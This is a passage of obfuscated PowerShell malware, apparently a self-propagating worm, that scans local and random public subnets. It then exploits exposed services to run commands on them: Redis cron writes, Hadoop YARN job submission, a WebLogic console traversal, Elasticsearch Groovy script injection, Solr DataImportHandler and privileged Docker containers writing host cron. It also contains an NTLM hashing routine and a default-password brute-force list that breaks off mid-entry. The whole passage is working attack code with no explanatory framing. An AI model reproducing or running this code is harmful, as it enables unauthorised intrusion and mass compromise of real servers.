			Unregister-Event -SourceIdentifier wB69oStdOutputEvent.Name

			Unregister-Event -SourceIdentifier wB69oStdErrEvent.Name

			return 0

		}

		if(wB69count -eq 0){

			wB69process.Kill()

			Unregister-Event -SourceIdentifier wB69oStdOutputEvent.Name

			Unregister-Event -SourceIdentifier wB69oStdErrEvent.Name

			return 0

		}

		Start-Sleep -milliseconds 100

		wB69count--

		if(wB69global:flag -ne -1) {

			Unregister-Event -SourceIdentifier wB69oStdOutputEvent.Name

			Unregister-Event -SourceIdentifier wB69oStdErrEvent.Name

			return wB69global:flag

		}

	}

}


function isPubIP {

	Param(

    [parameter(Mandatory=wB69true)][String]wB69ip

	)

	wB69resIps = @(

		@(4026531840L, 3758096384L),

		@(4026531840L, 4026531840L),

		@(4278190080L, 0L),

		@(4278190080L, 167772160L),

		@(4278190080L, 2130706432L),

		@(4290772992L, 1681915904L),

		@(4293918720L, 2886729728L),

		@(4294836224L, 3323068416L),

		@(4294901760L, 2851995648L),

		@(4294901760L, 3232235520L),

		@(4294967040L, 3221225472L),

		@(4294967040L, 3221225984L),

		@(4294967040L, 3227017984L),

		@(4294967040L, 3325256704L),

		@(4294967040L, 3405803776L),

		@(4294967295L, 4294967295L)

	)

	wB69iparr = wB69ip.split(NDck.NDck)

	wB69iplong = 0

	for(wB69i=3;wB69i -ge 0; wB69i--){

		wB69iplong = wB69iplong -bor [int]wB69iparr[3-wB69i] * [math]::pow(2,8*wB69i)

	}

	for(wB69j=0;wB69j -lt wB69resIps.count;wB69j++){

		if((wB69iplong -band wB69resIps[wB69j][0]) -eq wB69resIps[wB69j][1]){

			return wB69false

		}

	}

	return wB69true

}

function getipaddrs(wB69flag){

	write-host NDckGet ipaddress...NDck

	wB69global:ipaddrs_i = @()

	wB69global:ipaddrs_o = @()

	wB69allip = @()

	[string[]]wB69ipsub = @(utH9192.168.0utH9,utH9192.168'+'.1utH9,utH9192.168.2utH9,utH9192.168.3utH9,utH9192.168.4utH9,utH9192.168.5utH9,utH9192.168.6utH9,utH9192.168.7utH9,utH9192.168.8utH9,utH9192.168.9utH9,utH9192.168.10utH9,utH9192.168.18utH9,utH9192.168.31utH9,utH9192.168.199utH9,utH9192.168.254utH9,utH9192.168.67utH9,utH910.0.0utH9,utH910.0.1utH9,utH910.0.2utH9,utH910.1.1utH9,utH910.90.90utH9,utH910.1.10utH9,utH910.10.1utH9,utH9172.16.1utH9,utH9172.16.2utH9,utH9172.16.3utH9)

	[string[]]wB69ipsub_o = @()

	if(!wB69flag){

		wB69regex = [regex]NDck9e0b9e0d{1,3}9e0.9e0d{1,3}9e0.9e0d{1,3}9e0.9e0d{1,3}9e0bNDck


		wB69regex.Matches((ipconfig /all)) uOva ForEach-Object { 

			if (wB69allip -notcontains wB69_.Value)

			{ wB69allip += wB69_.Value }

		}

		wB69regex.Matches((ipconfig /displaydns)) uOva ForEach-Object { 

			if (wB69allip -notcontains wB69_.Value)

			{ wB69allip += wB69_.Value }

		}

		wB69regex.Matches((netstat -ano)) uOva ForEach-Object { 

			if (wB69allip -notcontains wB69_.Value)

			{ wB69allip += wB69_.Value }

		}

		try{

			wB69NetObject = New-Object Net.WebClient

			wB69wlanip = wB69NetObject.DownloadString(NDckhttps://api.ipify.org/NDck)   

			wB69allip += wB69wlanip           

		}catch{}

		try{

			wB69addressList = [System.Net.DNS]::GetHostByName(wB69null).AddressList     

			wB69localip = @()

			Foreach (wB69ip in wB69addressList)

			{

				wB69localip += wB69ip.IPAddressToString

				wB69allip += wB69localip

			}

		}catch{}

		

		foreach(wB69IP in wB69allip)

		{

			if(wB69IP.startswith(utH9127.utH9) -or wB69IP.startswith(utH9169.254.utH9) -or wB69IP.startswith(utH90.0.0.0utH9) -or wB69IP.startswith(utH9255.255.255.utH9)){

				continue

			}

			wB69iptemp = wB69ip.Split(NDck.NDck)

			wB69SubnetIP = wB69iptemp[0] + NDck.NDck +  wB69iptemp[1] + NDck.NDck +  wB69iptemp[2]

			if (wB69ipsub -notcontains wB69SubnetIP){ 

				if(isPubIP wB69IP){

					wB69ipsub_o = @(wB69SubnetIP) + wB69ipsub_o

				} else {

					wB69ipsub = @(wB69SubnetIP) + wB69ipsub

				}

			}

		}

		write-host NDckinter ipsub count:NDck(wB69ipsub.count)

		#wB69ipsub

		foreach(wB69ipsub2 in wB69ipsub)

		{	

			wB69global:ipaddrs_i += 0..255uOva%{wB69ipsub2+NDck.NDck+wB69_}

		}

		wB69global:ipaddrs_i = @(wB69global:ipaddrs_i uOva Where-Object { wB69localip -notcontains wB69_ })

	}

	while(wB69true){

		wB69ran_ipsub_b = NDckNDck+(0+(Get-Random -Maximum 255))+NDck.NDck+(0+(Get-Random -Maximum 255))

		if(isPubIP (wB69ran_ipsub_b+NDck.1.1NDck)){break}

	}

	wB69global:ipaddrs_b = wB69ran_ipsub_b

	for(wB69i=0; wB69i -lt 256; wB69i++){

		try{

			wB69ran_ipsub = wB69ran_ipsub_b+NDck.NDck+wB69i

			if(wB69ipsub_o -notcontains wB69ran_ipsub){

				wB69ipsub_o += wB69ran_ipsub

			}

		}catch{}

	}

	write-host NDckouter ipsub count:NDck(wB69ipsub_o.count)

	#wB69ipsub_o

	foreach(wB69ipsub3 in wB69ipsub_o)

	{	

		wB69global:ipaddrs_o += 0..255uOva%{wB69ipsub3+NDck.NDck+wB69_}

	}

	write-host NDckGet address done!!NDck

}


function localscan { 

	Param(

	[int]wB69Port = 445,

	[string[]]wB69addresses

	)

	[string[]]wB69openips = @()

	if(wB69addresses.count -gt 0){

		write-host (NDckscan port wB69port...from NDck+wB69addresses[0]+NDck to NDck+wB69addresses[wB69addresses.count-1])

		wB69clients = @{}

		wB69connects = @{}


		foreach(wB69ip in wB69addresses) {

			try{

				wB69client = New-Object System.Net.Sockets.TcpClient

				wB69connect = wB69client.BeginConnect(wB69ip,wB69port,wB69null,wB69null)

				wB69connects[wB69ip] = wB69connect

				wB69clients[wB69ip] = wB69client

			}

			catch{

				Write-host wB69Error[0]

			}

		}

		Start-Sleep 3

		foreach(wB69ip1 in wB69clients.Keys) {

			if (wB69clients[wB69ip1].Connected) {

				wB69clients[wB69ip1].EndConnect(wB69connects[wB69ip1])

				wB69openips += wB69ip1

			}

			wB69cli'+'ents[wB69ip1].Close()

		}

		NDcktotal scan ip port open count:NDck+wB69openips.count

		write-host wB69openips

	}


	return ,wB69openips

}


function redisexec(wB69ip,wB69port,wB69cmd){

	function sendandread(wB69sock,wB69str){

		[Byte[]] wB69pkt = [Text.Encoding]::ASCII.getbytes(wB69str)

		wB69sock.Send(wB69pkt)uOvaout-null

		wB69nb = [Array]::CreateInstance((utH9bytutH9+utH9eutH9), 20000)

		wB69recv = wB69sock.Receive(wB69nb)

		wB69str1=[Text.Encoding]::ASCII.getstring(wB69nb[0..(wB69recv-1)])

		return wB69str1

	}

	try{

		wB69client = NEir8W-ir8objir8EcT System.Net.Sockets.TcpClient(wB69ip,wB69port)

	}catch{

		return 0

	}

	wB69sock = wB69client.Client

    wB69sock.ReceiveTimeout =5000

	wB69ret = sendandread wB69sock NDckinfoir8nNDck

	if(wB69ret.indexof(NDckos:LinuxNDck) -gt 0){

        wB69ret_f = 2

		write-host NDckFound no pass and linuxNDck

		wB69ret = sendandread wB69sock NDckconfig set dir /var/spool/cronir8nNDck

        if(wB69ret.indexof(NDckPermission deniedNDck) -gt 0){

            wB69ret_f = 1

        }

		wB69ret = sendandread wB69sock NDckconfig set dbfile'+'name rootir8nNDck

		wB69ret = sendandread wB69sock NDckset x2x NDckNDck9e0n9e0n9e0n*/1 * * * * wB69cmd9e0n9e0n9e0nNDckNDckir8nNDck

		wB69ret = sendandread wB69sock NDcksaveir8nNDck

		start-sleep 3

		wB69ret = sendandread wB69sock NDckconfig set dir /var/spool/cron/crontabsir8nNDck

		wB69ret = sendandread wB69sock NDcksaveir8nNDck

		write-host NDckDoneNDck

        wB69sock.Close()

		return wB69ret_f

	}

    wB69sock.Close()

	return 0

}

function yarnexec(wB69ip,wB69cmd){

	function urlpost(wB69ip,wB69path,wB69data){

        try{

            wB69client = NEir8W-ir8objir8EcT System.Net.Sockets.TcpClient(wB69ip,8088)

        }catch{

            return NDckNDck

        }

        wB69sock = wB69client.Client

        wB69sock.ReceiveTimeout =5000

        wB69data_length = wB69data.length

        wB69sock_send_str = NDckPOST wB69path HTTP/1.1ir8nHost: wB69{ip}:8088ir8nUser-Agent: curl/7.55.1ir8nAccept: */*ir8nNDck

        if(wB69data -ne NDckNDck){

            wB69sock_send_str += NDckContent-Type: application/jsonir8nContent-Length'+':wB69data_lengthir8nir8nwB69dataNDck

        }else {

            wB69sock_send_str += NDckir8nNDck

        }

		[Byte[]] wB69pkt = [Text.Encoding]::ASCII.getbytes(wB69sock_send_str)

		wB69sock.Send(wB69pkt)uOvaout-null

		wB69nb = [Array]::CreateInstance((utH9bytutH9+utH9eutH9), 20000)

		wB69recv = wB69sock.Receive(wB69nb)

		wB69str=[Text.Encoding]::ASCII.getstring(wB69nb[0..(wB69recv-1)])

        wB69sock.Close()

		return wB69str

	}

	wB69ret = urlpost wB69ip NDck/ws/v1/cluster/apps/new-applicationNDck NDckNDck

    if(wB69ret.indexOf(utH9NDckapplication-idNDckutH9) -ne -1){

        wB69keyid=(wB69ret -split utH9NDckutH9)[3]

        wB69keyname=-join([char[]](48..57+65..90+97..122)uOvaGet-Random -Count (6+(Get-Random)%6))

        wB69c'+'md = wB69cmd.replace(utH9NDckutH9,utH99e0NDckutH9)

        wB69postdata=NDck{NDckNDckapplication-idNDckNDck:NDckNDckwB69keyidNDckNDck,NDckNDckapplication-nameNDckNDck:NDckNDckwB69keynameNDckNDck,NDckNDckapplication-typeNDckNDck:NDckNDckYARNNDckNDck,NDckNDckam-container-specNDckNDck:{NDckNDckcommandsNDckNDck:{NDckNDckcommandNDckNDck:NDckNDckwB69cmdNDckNDck}}}NDck

        wB69ret1 = urlpost wB69ip NDck/ws/v1/cluster/appsNDck wB69postdata

        return wB69true

    }

	return wB69false

}

function logicexec(wB69ip,wB69cmd){

    try{

        wB69client = NEir8W-ir8objir8EcT System.Net.Sockets.TcpClient(wB69ip,7001)

    }catch{

        return wB69false

    }

    wB69sock = wB69client.Client

    wB69sock.ReceiveTimeout =5000

    wB69send_pkt = [Text.Encoding]::ASCII.getbytes(NDckt3 12.2.1ir8nAS:255ir8nHL:19ir8nir8nNDck)

    wB69sock.Send(wB69send_pkt)uOvaout-null

    wB69nb = [Array]::CreateInstance((utH9bytutH9+utH9eutH9), 20000)

	wB69recv = wB69sock.Receive(wB69nb)

    wB69str=[Text.Encoding]::ASCII.getstring(wB69nb[0..(wB69recv-1)])

    wB69sock.Close()uOvaout-null


    if(wB69str -match NDckHELO:(109e0.39e0.69e0.0uOva129e0.19e0.39e0.0uOva129e0.29e0.19e0.3uOva129e0.29e0.19e0.4uOva149e0.19e0.19e0.0)NDck){

        wB69logicver = wB69matches[1]

        wB69client1 = NEir8W-ir8objir8EcT System.Net.Sockets.TcpClient(wB69ip,7001)

        wB69sock1 = wB69client1.Client

        wB69sock1.ReceiveTimeout =5000

        if(wB69cmd -match NDckpowershellNDck){

            wB69exec_obj = NDcknew String[]{%27cmd%27,%27/c%27,%27wB69cmd%27}NDck

        } else{

            wB69exec_obj = NDcknew String[]{%27/bin/sh%27,%27-c%27,%27wB69cmd%27}NDck

        }

        wB69send_str = NDckGET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(wB69exec_obj);%22); HTTP/1.1ir8nHost: wB69{ip}:7001ir8nUser-Agent: curl/7.55.1ir8nAccept: */*ir8nContent-Type:application/x-www-form-urlencoded; charset=utf-8ir8nir8nNDck

        wB69send_pkt1 = [Text.Encoding]::ASCII.getbytes(wB69send_str)

        wB69sock1.Send(wB69send_pkt1)uOvaout-null

        return wB69logicver

    }

    return wB69false

}

function esexec(wB69ip,wB69cmd){

	function urlrequest(wB69ip,wB69path,wB69data){

        try{

            wB69client = NEir8W-ir8objir8EcT System.Net.Sockets.TcpClient(wB69ip,9200)

        }catch{

            return NDckNDck

        }

        wB69sock = wB69client.Client

        wB69sock.ReceiveTimeout =5000

        if(wB69data -ne NDckNDck){

            wB69data_length = wB69data.length

            wB69sock_send_str += NDckPOST wB69path HTTP/1.1ir8nHost: wB69{ip}:9200ir8nUser-Agent: curl/7.55.1ir8nAccept: */*ir8nContent-Type: application/x-www-form-urlencodedir8nContent-Length:wB69data_lengthir8nir8nwB69dataNDck

        }else {

            wB69sock_send_str += ND'+'ckGET wB69path HTTP/1.1ir8nHost: wB69{ip}:9200ir8nUser-Agent: curl/7.55.1ir8nAccept: */*ir8nir8nNDck

        }

		[Byte[]] wB69pkt = [Text.Encoding]::ASCII.getbytes(wB69sock_send_str)

		wB69sock.Send(wB69pkt)uOvaout-null

		wB69nb = [Array]::CreateInstance((utH9bytutH9+utH9eutH9), 20000)

		wB69recv = wB69sock.Receive(wB69nb)

		wB69str=[Text.Encoding]::ASCII.getstring(wB69nb[0..(wB69recv-1)])

        wB69sock.Close()

		return wB69str

	}

	wB69ret = urlrequest wB69ip NDck/NDck NDckNDck

    if(wB69ret -match utH9numberNDck : NDck([9e0d9e0.]+)NDckutH9 -and wB69matches[1] -le NDck1.4.2NDck){

        write-host NDckversion:NDck,(wB69matches[1]),NDck,seems vulNDck

        if(wB69cmd -match NDckpowershellNDck){

            wB69postdata = utH9{NDcksizeNDck:1,NDckscript_fieldsNDck: {NDcktest#NDck: {NDckscriptNDck:NDckjava.lang.Math.class.forName(9e0NDckjava.io.BufferedReader9e0NDck).getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(9e0NDckjava.io.InputStreamReader9e0NDck).getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(9e0NDckjava.lang.Runtime9e0NDck).getRuntime().exec([9e0NDckcmd9e0NDck,9e0NDck/c9e0NDck,utH9utH9utH9+wB69cmd+utH9utH9utH9] as String[]).getInputStream())).readLines()NDck,NDcklangNDck: NDckgroovyNDck}}}utH9

        } else{

            wB69postdata = utH9{NDcksizeNDck:1,NDckscript_fieldsNDck: {NDcktest#NDck: {NDckscriptNDck:NDckjava.lang.Math.class.forName(9e0NDckjava.io.BufferedReader9e0NDck).getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(9e0NDckjava.io.InputStreamReader9e0NDck).getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(9e0NDckjava.lang.Runtime9e0NDck).getRuntime().exec([9e0NDck/bin/sh9e0NDck,9e0NDck-c9e0NDck,utH9utH9utH9+wB69cmd+utH9utH9utH9] as String[]).getInputStream())).readLines()NDck,NDcklangNDck: NDckgroovyNDck}}}utH9

        }

        urlrequest wB69ip NDck/blogs/usersNDck utH9{NDcknameNDck:NDcktomNDck}utH9

        sleep 1

        wB69ret1 = urlrequest wB69ip NDck/_search?prettyNDck NDckwB69postdataNDck

        return wB69true

    }

	return wB69false

}

function solrexec(wB69ip,wB69cmd){

	function urlrequest(wB69ip,wB69path,wB69data){

        try{

            wB69client = NEir8W-ir8objir8EcT System.Net.Sockets.TcpClient(wB69ip,8983)

        }catch{

            return NDckNDck

        }

        wB69sock = wB69client.Client

        if(wB69data -ne NDckNDck){

            wB69data_length = wB69data.length

            wB69sock_send_str += NDckPOST wB69path HTTP/1.1ir8nHost: wB69{ip}:8983ir8nUser-Agent: curl/7.55.1ir8nAccept: */*ir8nContent-Type: application/x-www-form-urlencodedir8nX-Requested-With:XMLHttpRequestir8nReferer:http://wB69{ip}:8983/solr/ir8nContent-Length:wB69data_lengthir8nir8nwB69dataNDck

        }else {

            wB69sock_send_str += NDckGET wB69path HTTP/1.1ir8nHost: wB69{ip}:8983ir8nUser-Agent: curl/7.55.1ir8nAccept: */*ir8nir8nNDck

        }

		[Byte[]] wB69pkt = [Text.Encoding]::ASCII.getbytes(wB69sock_send_str)

		wB69sock.Send(wB69pkt)uOvaout-null

		wB69nb = [Array]::CreateInstance((utH9bytutH9+utH9eutH9), 200000)

		wB69recv = wB69sock.Receive(wB69nb)

		wB69str=[Text.Encoding]::ASCII.getstring(wB69nb[0..(wB69recv-1)])

        wB69sock.Close()

		return wB69str

	}

	wB69ret = urlrequest wB69ip NDck/solr/admin/coresNDck NDckNDck

    w'+'B69mc = [regex]::matches(wB69ret, utH9nameNDck:NDck(.+)NDckutH9)

    for(wB69i=0;wB69i -lt wB69mc.count;wB69i++){

        wB69core_name = wB69mc[wB69i].value.split(utH9NDckutH9)[2]

        wB69ret = urlrequest wB69ip NDck/solr/wB69core_name/admin/mbeans?cat=QUERY&wt=jsonNDck NDckNDck

        if(wB69ret.indexOf(NDckDataImportHandlerNDck) -ne -1){

            if(wB69cmd -match NDckpowershellNDck){

                wB69cmdlist = NDck[NDckNDckcmd.exeNDckNDck,NDckNDck/cNDckNDck, NDckNDckwB69cmdNDckNDck]NDck

            } else {

                wB69cmdlist = NDck[NDckNDck/bin/shNDckNDck,NDckNDck-cNDckNDck, NDckNDckwB69cmdNDckNDck]NDck'+'

            }

            wB69dataconfig = @NDck

<dataConfig>

  <dataSource type=NDckURLDataSourceNDck/>

  <script><![CDATA[

          function f1(data){new java.lang.ProcessBuilder[NDck(java.lang.String[])NDck](wB69cmdlist).start()}

  ]]></script>

  <document>

    <entity name=NDckstackoverflowNDck

        url=NDckwB69core_url/deps/solr.xmlNDck processor=NDckXPathEntityProcessorNDck forEach=NDck/feeduOva/feed/entryNDck transformer=NDckscript:f1NDck> 

    </entity>

  </document>

</dataConfig>

NDck@

            

            wB69postdata = NDckcommand=full-import&verbose=false&clean=false&commit=false&debug=true&core=wB69core_name&name=dataimport&dataConfig=NDck+wB69dataconfig.replace(NDcki'+'r8rNDck,NDckNDck).replace(NDckir8nNDck,NDckNDck).replace(NDck NDck,NDck+NDck)

            wB69ret = urlrequest wB69ip NDck/solr/wB69core_name/dataimport?_=1565530241159&indent=on&wt=jsonNDck wB69postdata

            return wB69core_name

        }

    }

	return wB69false

}

function dockerexec(wB69ip,wB69cmd){

	function urlrequest(wB69ip,wB69path,wB69data){

        try{

            wB69client = NEir8W-ir8objir8EcT System.Net.Sockets.TcpClient(wB69ip,2375)

        }catch{

            return NDckNDck

        }

        wB69sock = wB69client.Client

        if(wB69data -eq NDckNDck){

            wB69sock_send_str += NDckGET wB69path HTTP/1.1ir8nHost: wB69{ip}:2375ir8nUser-Agent: curl/7.55.1ir8nAccept: */*ir8nir8nNDck

        }else {

            if(wB69data -eq NDckDELETENDck){

                wB69sock_send_str += NDckDELETE wB69path HTTP/1.1ir8nHost: wB69{ip}:2375ir8nUser-Agent: curl/7.55.1ir8nAccept: */*ir8nir8nNDck

            }else{

                wB69data_length = wB69data.length

                wB69sock_send_st'+'r += NDckPOST wB69path HTTP/1.1ir8nHost: wB69{ip}:2375ir8nUser-Agent: curl/7.55.1ir8nAccept: */*ir8nContent-Type: application/jsonir8nContent-Length:wB69data_lengthir8nir8nwB69dataNDck

            }

        }

		[Byte[]] wB69pkt = [Text.Encoding]::ASCII.getbytes(wB69sock_send_str)

        wB69sock.Send(wB69pkt)uOvaout-null

		wB69nb = [Array]::CreateInstance((utH9bytutH9+utH9eutH9), 200000)

		wB69recv = wB69sock.Receive(wB69nb)

		wB69str=[Text.Encoding]::ASCII.getstring(wB69nb[0..(wB69recv-1)])

        wB69sock.Close()

		return wB69str

	}

	wB69ret = urlrequest wB69ip NDck/_pingNDck NDckNDck

    if(wB69ret -match NDckApi-Version: ([9e0d9e0.]+)NDck){

        wB69docker_version = wB69matches[1]

        wB69ret = urlrequest wB69ip NDck/vwB69docker_version/images/jsonNDck NDckNDck

        [Reflection.Assembly]::LoadWithPartialName(NDckSystem.Web.ExtensionsNDck)uOvaout-null

        try{

            wB69obj = (New-Object Web.Script.Serialization.JavaScriptSerializer).DeserializeObject(wB69ret.split(NDckir8nNDck)[-2])

        }catch{

            wB69obj = (New-Object Web.Script.Serialization.JavaScriptSerializer).DeserializeObject(wB69ret.split(NDckir8nNDck)[-1])

        }

        wB69imageid = (wB69obj[0].Id).split(NDck:NDck)[-1].substring(0,12)

        wB69tag = wB69obj[0].RepoTags[0]

        wB69postdata = @NDck

        {NDckHostnameNDck:NDckNDck,NDckDomainnameNDck:NDckNDck,NDckUserNDck:NDckrootNDck,NDckAttachStdinNDck:false,NDckAttachStdoutNDck:false,NDckAttachStderrNDck:false,NDckTtyNDck:false,NDckOpenStdinNDck:false,NDckStdinOnceNDck:false,NDckEnvNDck:null,NDckCmdNDck:[NDck/bin/shNDck,NDck-cNDck,NDckecho utH9* * * * * wB69cmdutH9 9e0u003e9e0u003e /mnt/root;echo 123NDck],NDckImageNDck:NDckwB69imageidNDck,NDckVolumesNDck:{},NDckWorkingDirNDck:NDckNDck,NDckEntrypointNDck:null,NDckOnBuildNDck:null,NDckLabelsNDck:{},NDckHostConfigNDck:{NDckBindsNDck:[NDck/var/spool/cron/:/mntNDck],NDckContainerIDFileNDck:NDckNDck,NDckLogConfigNDck:{NDckTypeNDck:NDckNDck,NDckConfigNDck:{}},NDckNetworkModeNDck:NDckdefaultNDck,NDckPortBindingsNDck:{},NDckRestartPolicyNDck:{NDckNameNDck:NDcknoNDck,NDckMaximumRetryCountNDck:0},NDckAutoRemoveNDck:false,NDckVolumeDriverNDck:NDckNDck,NDckVolumesFromNDck:null,NDckCapAddNDck:null,NDckCapDropNDck:null,NDckCgroupnsModeNDck:NDckNDck,NDckDnsNDck:[],NDckDnsOptionsNDck:[],NDckDnsSearchNDck:[],NDckExtraHostsNDck:null,NDckGroupAddNDck:null,NDckIpcModeNDck:NDckNDck,NDckCgroupNDck:NDckNDck,NDckLinksNDck:null,NDckOomScoreAdjNDck:0,NDckPidModeNDck:NDckNDck,NDckPrivilegedNDck:true,NDckPublishAllPortsNDck:false,NDckReadonlyRootfsNDck:false,NDckSecurityOptNDck:null,NDckUTSModeNDck:NDckNDck,NDckUsernsModeNDck:NDckNDck,NDckShmSizeNDck:0,NDckConsoleSizeNDck:[0,0],NDckIsolationNDck:NDckNDck,NDckCpuSharesNDck:0,NDckMemoryNDck:0,NDckNanoCpusNDck:0,NDckCgroupParentNDck:NDckNDck,NDckBlkioWeightNDck:0,NDckBlki'+'oWeightDeviceNDck:[],NDckBlkioDeviceReadBpsNDck:null,NDckBlkioDeviceWriteBpsNDck:null,NDckBlkioDeviceReadIOpsNDck:null,NDckBlkioDeviceWriteIOpsNDck:null,NDckCpuPeriodNDck:0,NDckCpuQuotaNDck:0,NDckCpuRealtimePeriodNDck:0,NDckCpuRealtimeRuntimeNDck:0,NDckCpusetCpusNDck:NDckNDck,NDckCpusetMemsNDck:NDckNDck,NDckDevicesNDck:[],NDckDeviceCgroupRulesNDck:null,NDckDeviceRequestsNDck:null,NDckKernelMemoryNDck:0,NDckKernelMemoryTCPNDck:0,NDckMemoryReservationNDck:0,NDckMemorySwapNDck:0,NDckMemorySwappinessNDck:-1,NDckOomKillDisableNDck:false,NDckPidsLimitNDck:0,NDckUlimitsNDck:null,NDckCpuCountNDck:0,NDckCpuPercentNDck:0,NDckIOMaximumIOpsNDck:0,NDckIOMaximumBandwidthNDck:0,NDckMaskedPathsNDck:null,NDckReadonlyPat'+'hsNDck:null},NDckNetworkingConfigNDck:{NDckEndpointsConfigNDck:{}},NDckPlatformNDck:null}

NDck@.trim()

        wB69ret = urlrequest wB69ip NDck/vwB69docker_version/containers/createNDck wB69postdata

        wB69containerid = wB69ret.split(utH9NDckutH9)[3].substring(0,12)

        wB69ret = urlrequest wB69ip NDck/vwB69docker_version/containers/wB69containerid/startNDck NDck NDck

        sleep 3

        wB69ret = urlrequest wB69ip NDck/vwB'+'69docker_version/containers/wB69containeridNDck NDckDELETENDck

        return NDckwB69docker_version wB69tag wB69imageidNDck

    }

	return wB69false

}

function Gen-NTLM(wB69str){

	Add-Type -TypeDefinition @utH9

	using System;

	using System.Text;

	using System.Runtime.InteropServices;

	public class BCrypt

	{

		[DllImport(NDckbcrypt.dllNDck, CharSet = CharSet.Auto)]

		public static extern NTStatus BCryptOpenAlgorithmProvider(

			[Out] out IntPtr phAlgorithm,

			[In] string pszAlgId,

			[In, Optional] string psz'+'Implementation,

			[In] UInt32 dwFlags);


		[DllImport(NDckbcrypt.dllNDck)]

		public static extern NTStatus BCryptCloseAlgorithmProvider(

			[In, Out] IntPtr hAlgorithm,

			[In] UInt32 dwFlags);


		[DllImport(NDckbcrypt.dllNDck, CharSet = CharSet.Auto)]

		public static extern NTStatus BCryptCreateHash(

			[In, Out] IntPtr hAlgorithm,

			[Out] out IntPtr phHash,

			[Out] IntPtr pbHashObject,

			[In, Optional] UInt32 cbHashObject,

			[In, Optional] IntPtr pbSecret,

			[In] UInt32 cbSecret,

			[In] UInt32 dwFlags);


		[DllImport(NDckbcrypt.dllNDck)]

		public static extern NTStatus BCryptDestroyHash(

			[In, Out] IntPtr hHash);


		[DllImport(NDckbcrypt.dllNDck)]

		public static extern NTStatus BCryptHashData(

			[In, Out] IntPtr hHash,

			[In, MarshalAs(UnmanagedType.LPArray)] byte[] pbInput,

			[In] int cbInput,

			[In] UInt32 dwFlags);


		[DllImport(NDckbcrypt.dllNDck)]

		public static extern NTStatus BCryptFinishHash(

			[In, Out] IntPtr hHash,

			[Out, MarshalAs(UnmanagedType.LPArray)] byte[] '+'pbInput,

			[In] int cbInput,

			[In] UInt32 dwFlags);


		[Flags]

		public enum AlgOpsFlags : uint

		{            

			BCRYPT_PROV_DISPATCH = 0x00000001,

			BCRYPT_ALG_HANDLE_HMAC_FLAG = 0x00000008,

			BCRYPT_HASH_REUSABLE_FLAG = 0x00000020

		}

		public enum NTStatus : uint

		{

			STATUS_SUCCESS = 0x00000000

		}

	}

utH9@

	wB69DataToHash = wB69([Text.Encoding]::Unicode.GetBytes(wB69str))

	[Byte[]]wB69HashBytes   = New-Object Byte[] 16

	[IntPtr]wB69PHAlgorithm = [IntPtr]::Zero

	[IntPtr]wB69PHHash      = [IntPtr]::Zero

	wB69NTStatus = [BCrypt]::BCryptOpenAlgorithmProvider([Ref] wB69PHAlgorithm, utH9MD4utH9, wB69Null, 0)

	If (wB69NTStatus -NE 0)

	{

		Write-Error NDckBCryptOpenAlgorithmProvider failed with NTSTATUS wB69NTStatusNDck

		If (wB69PHAlgorithm -NE [IntPtr]::Zero)

		{

			wB69NTStatus = [BCrypt]::BCryptCloseAlgorithmProvider(wB69PHAlgorithm, 0)

		}

		Return

	}

	wB69NTStatus = [BCrypt]::BCryptCreateHash(wB69PHAlgorithm, [Ref] wB69PHHash, [IntPtr]::Zero, 0, [IntPtr]::Zero, 0, 0)

	If (wB69NTStatus -NE 0)

	{

		Write-Error NDckBCryptCreateHash failed with NTSTATUS wB69NTStatusNDck

		If (wB69PHHash -NE [IntPtr]::Zero)

		{

			wB69NTStatus = [BCrypt]::BCryptDestroyHash(wB69PHHash)                

		}

		If (wB69PHAlgorithm -NE [IntPtr]::Zero)

		{

			wB69NTStatus = [BCrypt]::BCryptCloseAlgorithmProvider(wB69PHAlgorithm, 0)

		}

		Return

	}


	wB69NTStatus = [BCrypt]::BCryptHashData(wB69PHHash, wB69DataToHash, wB69DataToHash.Length, 0)

	wB69NTStatus = [BCrypt]::BCryptFinishHash(wB69PHHash, wB69HashBytes, wB69HashBytes.Length, 0)


	If (wB69PHHash -NE [IntPtr]::Zero)

	{

		wB69NTStatus = [BCrypt]::BCryptDestroyHash(wB69PHHash)

	}

	If (wB69PHAlgorithm -NE [IntPtr]::Zero)

	{

		wB69NTStatus = [BCrypt]::BCryptCloseAlgorithmProvider(wB69PHAlgorithm, 0)

	}


	wB69HashString = New-Object System.Text.StringBuilder

	Foreach (wB69Byte In wB69HashBytes)

	{

		[Void]wB69HashString.Append(wB69Byte.ToString(NDckX2NDck))

	}

	Return wB69HashString.ToString()

}

[string[]]wB69global:alluser = @(NDckadministratorNDck,NDckadminNDck)


[string[]]wB69global:WmicUSER = @(NDckadministratorNDck)  

[string[]]wB69global:allpass = @(NDckhelloworldNDck,NDcksaadminNDck,NDck123456NDck,NDcktest1NDck,NDckzinchNDck,NDckg_czechoutNDck,NDckasdfNDck,NDckAa123456.NDck,NDckdubsmashNDck,NDckpasswordNDck,NDckPASSWORDNDck,NDck123.comNDck,NDckadmin@123NDck,NDckAa123456NDck,NDckqwer12345NDck,NDckHuawei@123NDck,NDck123@abcNDck,NDckgoldenNDck,NDck123!@#qweNDck,NDck1qaz@WSXNDck,NDckAb123NDck,NDck1qaz!QAZNDck,NDckAdmin123NDck,NDckAdministratorNDck,NDckAbc123NDck,NDckAdmin@123NDck,NDck999999NDck,NDckPassw0rdNDck,NDck123qwe!@#NDck,NDckfootballNDck,NDckwelcomeNDck,NDck1NDck,NDck12NDck,NDck21NDck,NDck123NDck,NDck321NDck,NDck1234NDck,NDck12345NDck,NDck123123NDck,NDck123321NDck,NDck111111NDck,NDck654321NDck,NDck666666NDck,NDck121212NDck,NDck000000NDck,NDck222222NDck,NDck888888NDck,NDck1111NDck,NDck555555NDck,NDck1234567NDck,NDck12345678NDck,NDck123456789NDck,NDck987654321NDck,NDckadminNDck,NDckabc123NDck,NDckabcd1234NDck,NDckabcd@1234NDck,NDckabc@123NDck,NDckp@sswordNDck,NDckP@sswordNDck,NDckp@ssw0rdNDck,NDckP@ssw0rdNDck,NDckP@SSWORDNDck,NDckP@SSW0RDNDck,NDckP@w0rdNDck,NDckP@wordNDck,NDckiloveyouNDck,NDckmonkeyNDck,NDckloginNDck,NDckpassw0rdNDck,NDckmasterNDck,NDckhelloNDck,NDckqazwsxNDck,NDckpassword1NDck,NDckPas